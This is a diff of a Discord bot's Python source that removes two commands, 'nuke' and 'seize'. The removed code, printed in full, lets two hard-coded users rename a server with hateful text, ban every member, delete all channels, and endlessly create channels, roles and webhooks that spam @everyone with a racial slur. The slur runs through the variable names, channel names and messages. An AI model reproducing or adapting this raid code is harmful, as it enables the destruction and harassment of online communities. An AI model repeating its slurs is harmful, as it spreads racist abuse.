@@ -152,48 +152,6 @@ async def troll(ctx):
 # Start of Nuke
 @client.command()
 async def nuke(ctx):
-    nigger = 0
-    hooks = []
-    guild = ctx.message.guild
-    if str(ctx.message.author) == "Hell Bringer#9286" or str(ctx.message.author) == "꧁ ᎴᎯᏟᏲᎴ ᎿᏲᏋ ᏰᎯᎴᏋᏍ ꧂#7802":
-        await ctx.guild.edit(
-            name="Heil ᎴᎯᏟᏲᎴ",
-            description="Fucked by ᎴᎯᏟᏲᎴ lollolll",
-            reason="ᎴᎯᏟᏲᎴ hates you",
-            icon=image1,
-            banner=image1
-        )
-        for member in ctx.guild.members:
-            try:
-                await member.ban()
-            except:
-                pass
-        guild = ctx.guild
-        for channel in guild.channels:
-            await channel.delete()
-
-        ch = 0
-        m = 0
-        chc = await guild.create_text_channel("Get Niggered")
-        while ch < 50:
-            while True:
-                for i in range(20):
-                    await guild.create_text_channel("Get Niggered")
-                    chc = await guild.create_text_channel("Get Niggered")
-                    webhook = await chc.create_webhook(name="Get Niggered", avatar=image1, reason="Get niggered")
-                    webhook_url = webhook.url
-                    hooks.append(webhook_url)
-                    await guild.create_role(name="nigger")
-
-                while True:
-                    for x in hooks:
-                        webhook_url = x
-                        async with aiohttp.ClientSession() as session:
-                            webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
-                            for i in range(5):
-                                await webhook.send(f"@everyone Get niggered")
-            ch = ch + 1
-    else:
         await ctx.send("You fucking wish LMAO")
 
 
@@ -258,31 +216,6 @@ async def help(ctx, category=None):
 
 # End of Help
 
-@client.command()
-async def seize(ctx):
-    nigger = 0
-    hooks = []
-    guild = ctx.message.guild
-    while True:
-        if nigger < 26:
-            chc = await guild.create_text_channel("Get Niggered")
-            webhook = await chc.create_webhook(name="Get Niggered", avatar=image1, reason="Get niggered")
-            webhook_url = webhook.url
-            hooks.append(webhook_url)
-            async with aiohttp.ClientSession() as session:
-                webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
-                for i in range(5):
-                    await webhook.send(f"@everyone Get niggered")
-            print(hooks)
-            nigger = nigger + 1
-
-        elif nigger > 25:
-            for x in hooks:
-                webhook_url = x
-                async with aiohttp.ClientSession() as session:
-                    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
-                    for i in range(15):
-                        await webhook.send(f"@everyone Get niggered")
 
 @client.command(aliases = ['gayrate', 'gay'])
 async def howgay(ctx, member: discord.User = None, ):
